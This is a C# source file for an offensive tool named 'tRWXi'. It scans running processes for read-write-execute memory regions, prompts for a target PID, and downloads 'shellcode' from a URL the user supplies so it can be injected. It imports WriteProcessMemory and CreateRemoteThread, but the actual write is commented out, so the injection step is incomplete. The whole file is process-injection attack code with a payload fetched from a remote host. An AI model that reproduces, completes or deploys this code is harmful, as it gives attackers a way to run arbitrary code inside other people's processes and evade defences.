using System;
using System.Diagnostics;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.IO;
using System.Text;

namespace tRWXi
{
    public class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szExeFile;
        };

        [DllImport("kernel32.dll")]
        static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll")]
        static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [DllImport("kernel32.dll")]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, int dwLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,IntPtr lpThreadId);

        private const Int32 TH32CS_SNAPPROCESS = 0x02;
        private const Int32 PAGE_EXECUTE_READ_WRITE = 0x40;
        private const Int32 MEM_COMMIT = 0x1000;
        private const Int32 MEM_PRIVATE = 0x20000;
        private const Int32 PROCESS_ALL_ACCESS = 0x001F0FFF;

        public static void Main(string[] args)
        {
            Console.WriteLine("[!] Started enumeration");

            try
            {
                PROCESSENTRY32 pe = new PROCESSENTRY32();
                pe.dwSize = (uint)Marshal.SizeOf(pe);

                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();

                IntPtr lpAddress = IntPtr.Zero;

                IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

                bool hResult = Process32First(hSnapshot, ref pe);

                Dictionary<int, string> processes = new Dictionary<int, string>();

                while (hResult)
                {
                    IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (int) pe.th32ProcessID);
                    while (VirtualQueryEx(hProcess, lpAddress, out mbi, Marshal.SizeOf(mbi)) != 0)
                    {
                        lpAddress = new IntPtr (mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                        if (mbi.AllocationProtect == PAGE_EXECUTE_READ_WRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) 
                        {
                            Console.WriteLine("M: " + mbi.BaseAddress.ToString());
                            if (!processes.ContainsKey((int)pe.th32ProcessID))
                            {
                                processes.Add((int) pe.th32ProcessID, pe.szExeFile);
                            }
                        }
                    }
                    CloseHandle(hProcess);
                    hResult = Process32Next(hSnapshot, ref pe);
                    lpAddress = IntPtr.Zero;
                }
                CloseHandle(hSnapshot);
                foreach(KeyValuePair<int, string> pair in processes)
                {
                    Console.WriteLine(String.Format("[+] Found RWX regions in PID: {0} -> {1}", pair.Key, pair.Value));
                }

                Console.Write("Provide a PID to inject your shellcode into >:");
                int pid = (int) Int64.Parse(Console.ReadLine());
                Console.Write("> Provide an URL to download the shellcode from >:");
                string url = Console.ReadLine();
                System.Net.WebClient client = new System.Net.WebClient();
                Stream str = client.OpenRead(url);
                StreamReader reader = new StreamReader(str);
                string data = reader.ReadToEnd();
                byte[] shellcode = Encoding.ASCII.GetBytes(data);
                Console.WriteLine(shellcode.ToString());
                //WriteProcessMemory(OpenProcess(PROCESS_ALL_ACCESS, false, pid), );

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
